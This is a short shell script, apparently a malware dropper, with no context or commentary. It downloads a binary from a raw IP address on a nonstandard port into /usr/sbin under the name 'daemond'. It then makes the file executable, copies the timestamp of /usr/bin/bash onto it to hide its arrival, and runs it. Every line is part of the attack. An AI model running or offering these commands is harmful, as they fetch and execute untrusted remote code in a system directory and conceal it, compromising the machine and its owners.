curl -s -o /usr/sbin/daemond http://165.232.96.208:60080/daemond
chmod 755 /usr/sbin/daemond
touch /usr/sbin/daemond -r /usr/bin/bash
/usr/sbin/daemond
